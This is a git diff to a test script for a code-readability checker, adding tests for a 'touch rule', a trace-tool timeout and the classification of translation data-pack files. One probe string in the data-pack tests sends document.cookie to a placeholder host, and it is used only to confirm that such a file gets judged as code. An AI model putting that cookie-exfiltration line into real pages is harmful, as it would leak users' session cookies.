@@ -57,6 +57,8 @@ const BASE = {
   'public/app/minimums.js': HEADER('minimums') + 'function paintMinimums(rows) {\n  return rows.length;\n}\n',
   'public/app/worse.js': HEADER('worse') + 'function paintWorse(rows) {\n  return rows.length;\n}\n',
   'public/app/better.js': HEADER('better') + longFunction('getsShorter', 45),
+  'public/app/partial.js': HEADER('partial') + longFunction('stillLongA', 45) + longFunction('stillLongB', 45),
+  'public/app/stuck.js': HEADER('stuck') + longFunction('stuckLong', 45),
   'docs/notes.md': '# notes\n'
 };
 const HEAD = {
@@ -73,6 +75,8 @@ const HEAD = {
   'public/app/minimums.js': HEADER('minimums') + 'function paintMinimums(rows) {\n  return rows.length + 1;\n}\n',
   'public/app/worse.js': HEADER('worse') + 'function paintWorse(rows) {\n  return rows.length;\n}\n' + longFunction('nowLong', 45),
   'public/app/better.js': HEADER('better') + longFunction('getsShorter', 20),
+  'public/app/partial.js': HEADER('partial') + longFunction('stillLongA', 45) + longFunction('stillLongB', 20),
+  'public/app/stuck.js': HEADER('stuck') + longFunction('stuckLong', 45).replace('total += 3;', 'total += 30;'),
   'docs/notes.md': '# notes\n\nmore words\n'
 };
 const TRACE = { generated: '2026-10-15', repo: 'web', modules: {} };
@@ -147,6 +151,22 @@ const ratchet1 = JSON.parse(fs.readFileSync(path.join(tmp, 'readability.ratchet.
 ok(ratchet1['public/app/better.js'].score < ratchet0['public/app/better.js'].score, '--write lowered better.js (' + ratchet0['public/app/better.js'].score + ' → ' + ratchet1['public/app/better.js'].score + ')');
 ok(ratchet1['public/app/worse.js'].score === 0 && /refused public\/app\/worse\.js/.test(tightened.stdout), '--write refused to raise worse.js (lower only)');
 
+console.log('\n3b · the touch rule (MNT-30): warn mode today, fail with --strict or from the switch date');
+const touchOf = (file, level) => result.findings.filter((finding) => finding.rule === 'touch' && finding.text.includes(file) && finding.level === level);
+const touchRule = require(path.join(ROOT, 'tools/readability/touch.cjs'));
+ok(touchOf('partial.js', 'warn').length === 1 && /better but not at 0/.test(touchOf('partial.js', 'warn')[0].text), 'a touched file that got better but is not at 0 WARNS (partial.js)');
+ok(touchOf('stuck.js', 'warn').length === 1 && /not better/.test(touchOf('stuck.js', 'warn')[0].text), 'a touched file that is not better WARNS (stuck.js)');
+ok(touchOf('better.js', 'warn').length === 0 && touchOf('rename.js', 'warn').length === 0, 'a touched file at 0 raises no touch finding');
+ok(!result.findings.some((finding) => finding.rule === 'touch' && finding.level === 'fail'), 'warn mode turns nothing red on its own');
+ok(/Touch rule \(report, warn mode until \d{4}-\d\d-\d\d\): touched files at 0 failures \d+\/\d+/.test(result.markdown), 'the --md checklist carries the Touch rule line');
+run([TOOL, '--changed', '--repo', 'web', '--root', tmp, '--base', baseSha, '--ratchet', '--strict', '--today', '2026-10-16', '--json', out]);
+const strictResult = JSON.parse(fs.readFileSync(out, 'utf8'));
+ok(['partial.js', 'stuck.js'].every((file) => strictResult.findings.some((finding) => finding.rule === 'touch' && finding.level === 'fail' && finding.text.includes(file))), '--strict makes the touch rule FAIL both files');
+run([TOOL, '--changed', '--repo', 'web', '--root', tmp, '--base', baseSha, '--ratchet', '--today', touchRule.FAIL_FROM, '--json', out]);
+ok(JSON.parse(fs.readFileSync(out, 'utf8')).findings.some((finding) => finding.rule === 'touch' && finding.level === 'fail'), 'from ' + touchRule.FAIL_FROM + ' the touch rule fails without a flag');
+ok(touchRule.verdictOf({ score: 3 }, { score: 0 }) === 'zero' && touchRule.verdictOf({ score: 3 }, { score: 2 }) === 'better' && touchRule.verdictOf({ score: 3 }, { score: 3 }) === 'same' && touchRule.verdictOf({ score: 2 }, { score: 3 }) === 'worse' && touchRule.verdictOf(null, { score: 1 }) === 'same', 'verdictOf: zero, better, same, worse, a new file not at 0');
+ok(touchRule.modeFor('2026-11-06') === 'warn' && touchRule.modeFor(touchRule.FAIL_FROM) === 'fail' && touchRule.modeFor('2026-11-06', 'fail') === 'fail', 'modeFor: warn before the date, fail from it, an explicit option wins');
+
 console.log('\n4 · a docs-only change judges nothing and passes');
 git(tmp, ['add', '-A']); git(tmp, ['commit', '-q', '-m', 'head']);
 fs.writeFileSync(path.join(tmp, 'docs/notes.md'), '# notes\n\nonly docs now\n');
@@ -167,6 +187,12 @@ ok(booksRow && booksRow.routesServed.some((route) => /POST \/api\/books\/payment
 ok(booksRow && Array.isArray(booksRow.minimums.missing) && booksRow.minimums.have.includes('one-success-path'), 'its §7 minimums are evidenced from its tests (one-success-path present)');
 const libRow = trace && trace.modules['lib/pay.js'];
 ok(libRow && libRow.layer === 'lib' && libRow.calledBy.some((file) => /routes\/books\.js/.test(file)), 'lib/pay.js is called by routes/books.js');
+/* MNT-49 part 2: a run that cannot finish is stopped and says so; the guard asks for ONE repo */
+const stopped = spawnSync(process.execPath, [TRACE_TOOL, '--repo', 'api', '--no-build', '--stdout', '--max-seconds', '0.001'], { encoding: 'utf8' });
+ok(stopped.status === 124 && /stopped after 0\.001s \(--max-seconds\)/.test(stopped.stderr), 'trace.cjs past its --max-seconds is stopped: exit 124 and a sentence saying why');
+const bareFlag = spawnSync(process.execPath, [TRACE_TOOL, '--repo', 'api', '--no-build', '--stdout', '--max-seconds'], { encoding: 'utf8', timeout: 60000, env: Object.assign({}, process.env, { CB_GRAPH_ROOTS: 'web=' + path.join(KG_FIXTURE, 'web') + ',api=' + path.join(KG_FIXTURE, 'api') + ',engines=' + path.join(KG_FIXTURE, 'engines') }) });
+ok(bareFlag.status !== 124, 'a bare --max-seconds means the default, not one second');
+ok(/\[TRACE_TOOL, '--repo', repo,/.test(fs.readFileSync(path.join(ROOT, 'tools/readability.cjs'), 'utf8')), 'the readability guard builds a missing trace for ONE repo (--repo), never the three-repo default');
 
 console.log('\n6 · the modules behind the tool, one unit each');
 const measure = require('../tools/readability/measure.cjs');
@@ -174,6 +200,21 @@ const facts = measure.factsFromText('public/app/unit.js', HEADER('unit') + 'func
 ok(facts.functions.length === 2 && facts.functions[0].name === 'readShop' && facts.functions[1].complexity === 5, 'measure: two functions, manyBranches has complexity 5 (' + facts.functions.map((fn) => fn.name + ' c' + fn.complexity).join(', ') + ')');
 ok(facts.cryptic.length === 1 && facts.cryptic[0].name === 'q' && facts.emptyCatches.length === 1 && facts.header.card === 'qa/fixture-unit', 'measure: one cryptic name, one empty catch, the CARD line read');
 ok(measure.inScope('web', 'public/app/x.js') && !measure.inScope('web', 'public/till.html') && !measure.inScope('web', 'e2e/x.cjs') && !measure.inScope('api', 'lib/money.js', '/* ADOPTED from chitbridge-engines v1 · money */'), 'measure: scope — own code in, the vendored till / a test / an adopted copy out');
+/* data packs: a pure translation pack is DATA (not judged); the same file with a helper function is code (judged) */
+const PACK_HEAD = "(function () {\n  if (typeof CBSTR === 'undefined') return;\n  var fr = CBSTR.fr || (CBSTR.fr = {});\n  var pack = { 'Save': 'Enregistrer', 'Cancel': 'Annuler' };\n";
+const PACK_TAIL = "  for (var k in pack) if (Object.prototype.hasOwnProperty.call(pack, k)) fr[k] = pack[k];\n  try {\n    if (typeof renderApp === 'function') renderApp();\n  } catch (_) {}\n";
+const packWith = (extra) => PACK_HEAD + extra + PACK_TAIL + '})();\n';
+const PACK_OK = packWith('') + packWith('');
+/* the critic's probes: a statement that is not one of the four pack shapes makes the file code, wherever it sits in the wrapper */
+const PROBES = { fetch: "fetch('https://x/y?' + document.cookie);\n", eval: 'eval(pack.Save);\n', if: "if (location.host) { pack.Save = 'x'; }\n" };
+for (const name of Object.keys(PROBES)) ok(!measure.isDataPack('public/app/strings-fr.js', packWith(PROBES[name])) && measure.inScope('web', 'public/app/strings-fr.js', packWith(PROBES[name])), 'data pack: a ' + name + ' statement inside the wrapper makes the file code, judged');
+ok(!measure.isDataPack('public/app/strings-fr.js', PACK_OK + "fetch('https://x/y');\n"), 'data pack: a loose statement outside any wrapper makes the file code, judged');
+const PACK_FN = "(function () {\n  var pack = { 'Save': 'Enregistrer' };\n  function shout(text) { return text.toUpperCase(); }\n  pack.Save = shout(pack.Save);\n})();\n";
+const PACK_VALUE = "(function () {\n  var pack = { 'Save': 'Enregistrer', 'Count': 3 };\n})();\n";
+ok(measure.isDataPack('public/app/strings-fr.js', PACK_OK) && !measure.inScope('web', 'public/app/strings-fr.js', PACK_OK), 'data pack: a pure string pack (two wrappers, string → string pairs) is not judged');
+ok(!measure.isDataPack('public/app/strings-fr.js', PACK_FN) && measure.inScope('web', 'public/app/strings-fr.js', PACK_FN), 'data pack: a pack file holding a helper function is still judged');
+ok(!measure.isDataPack('public/app/strings-fr.js', PACK_VALUE) && measure.inScope('web', 'public/app/strings-fr.js', PACK_VALUE), 'data pack: a non-string value in the pack makes it code, judged');
+ok(measure.inScope('web', 'public/app/locale.js', PACK_OK), 'data pack: only the strings-<lang>.js name is exempt — the same text under another name is judged');
 /* INT7b: a route handler pairs with its own route when the file grows above it; a function with no route pairs as before */
 const ROUTES = (pad) => "/* api fixture */\nconst router = {};\n" + pad + "router.get('/a', async (req, res) => {\n  return 1;\n});\n" +
   "router.post('/b', auth, async (req, res) => {\n  if (req.x) return 2;\n  if (req.y) return 3;\n  return 4;\n});\nfunction helper(rows) {\n  return rows;\n}\n";
@@ -194,7 +235,7 @@ const parsed = diffReader.parseDiff('diff --git a/x.js b/x.js\n--- a/x.js\n+++ b
 ok(parsed.length === 3 && parsed[0].status === 'modified' && JSON.stringify(parsed[0].ranges) === '[[4,5],[12,12]]' && parsed[1].status === 'added' && parsed[2].status === 'deleted', 'changed: the diff grammar — modified ranges, an added file, a deleted file');
 const baselineReport = require('../tools/readability/baseline.cjs');
 const metrics = baselineReport.metrics('web', tmp, 5);
-ok(metrics.files === 13 && metrics.R3.over_80 === 4 && metrics.R1.cryptic_declarations >= 2, 'baseline: R1–R6 over the fixture (13 files, 4 functions over 80 lines)');
+ok(metrics.files === 15 && metrics.R3.over_80 === 4 && metrics.R1.cryptic_declarations >= 2, 'baseline: R1–R6 over the fixture (15 files, 4 functions over 80 lines)');
 
 console.log('\n7 · pr-checklist (tools/pr-checklist.cjs): the body must carry the five lines with numbers; bots and docs-only skip');
 const checklist = require('../tools/pr-checklist.cjs');
